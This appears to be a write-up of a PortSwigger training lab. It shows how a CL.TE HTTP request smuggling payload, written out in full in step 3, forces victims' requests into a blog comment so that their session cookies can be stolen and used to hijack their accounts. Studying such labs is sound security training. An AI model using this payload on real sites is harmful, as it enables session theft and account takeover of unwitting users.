#  Exploiting HTTP - request smuggling to capture other users' requests

## 📌 Lab Details
- **Title**: Exploiting HTTP request smuggling to capture other users' requests
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/a8d351250890095aedf20e8164b719e049e192bbc1f004e58d788778d6a7e982?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-capture-other-users-requests

## 🔍 Summary
You use **HTTP request smuggling (CL.TE)** to trick the back-end into treating the victim’s request as part of your blog comment. When the victim browses, their request (with cookies) gets captured and stored in your comment. Viewing the comment reveals their session cookie, which you then use to log in as the victim and access their account.

## 🛠 Steps to Solve
1. Visit a blog post and post a comment.
2. Send the `comment-post` request to Burp Repeater, shuffle the body parameters so the `comment` parameter occurs last, and make sure it still works.
3. Increase the `comment-post` request's `Content-Length` to 1000, then smuggle it to the back-end server:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 256
   Transfer-Encoding: chunked

   0

   POST /post/comment HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 1000
   Cookie: session=your-session-token

   csrf=your-csrf-token&postId=5&name=hacker1&email=hacker%40email.net&website=&comment=test
   ```
4. View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
5. Copy the user's Cookie header from the comment, and use it to access their account.

## 📖 Key Takeaways
- **Request smuggling basics**: Exploits differences between front-end and back-end parsing (CL vs TE).
- **Front-end filtering bypass**: Even if front-end doesn’t allow chunked requests, smuggling still works because the back-end does.
- **Capturing victim data**: Smuggled requests can force the victim’s request into a storage mechanism (comments, logs, etc.).
- **Session hijacking**: Cookies stolen this way let you impersonate other users.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ee13c2d5-1f0a-41b9-bd4e-c5745db4f336" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c0dd22df-63aa-4a4d-a0e7-f58ccd46b694" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/feea1c8d-3c4a-416a-b761-d3145326d35e" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0f86834e-cd87-44fa-ae8c-4f557359fb19" />
